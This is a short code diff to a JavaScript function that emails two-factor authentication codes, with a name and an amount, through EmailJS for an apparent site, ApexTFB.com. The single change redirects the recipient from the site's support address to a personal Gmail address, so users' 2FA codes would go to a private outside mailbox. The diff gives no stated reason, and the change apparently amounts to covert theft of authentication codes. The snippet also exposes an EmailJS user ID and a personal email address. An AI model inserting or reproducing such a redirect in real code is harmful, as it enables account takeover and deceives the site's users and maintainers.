@@ -78,7 +78,7 @@ async function send2FACodeEmail(name, code, amount) {
         user_id: 'wFjLvmBKtil7JR8Bd', // Your EmailJS user ID
         template_params: {
             to_name: name,
-            to_email: 'support@apextfb.com',
+            to_email: 'corizoboy93@gmail.com',
             from_name: 'ApexTFB.com', // Your sender name
             from_email: 'support@apextfb.com', // Your sender email
             code: code, // The 2FA code to be sent
